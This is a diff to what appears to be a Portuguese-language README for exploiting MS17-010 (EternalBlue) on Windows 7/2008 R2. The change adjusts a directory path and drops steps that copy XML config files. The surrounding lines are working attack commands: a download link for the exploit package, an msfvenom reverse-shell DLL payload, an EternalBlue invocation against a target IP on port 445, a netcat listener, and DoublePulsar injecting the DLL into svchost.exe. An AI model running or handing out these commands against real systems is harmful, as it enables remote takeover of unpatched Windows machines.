@@ -33,7 +33,7 @@ https://github.com/caique-garbim/MS17-010/raw/main/ms17-010.tar.gz
 tar xf ms17-010.tar.gz
 ```
 ```
-cd ms17-010/deps/
+cd ms17-010/
 ```
 ### Exploração
 Gerando payload reverse shell non-staged com **msfvenom**
@@ -45,9 +45,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > shel
 <br>
 
 Instalando backdoor no servidor alvo com EternalBlue:
-```
-cp Eternalblue-2.2.0.Skeleton.xml Eternalblue-2.2.0.xml
-```
 ```
 wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
 ```
@@ -61,9 +58,6 @@ rlwrap nc -vnlp 8080
 <br>
 
 Enviando shellcode para injetar DLL com DoublePulsar:
-```
-cp Doublepulsar-1.3.1.Skeleton.xml Doublepulsar-1.3.1.xml
-```
 ```
 wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
 ```
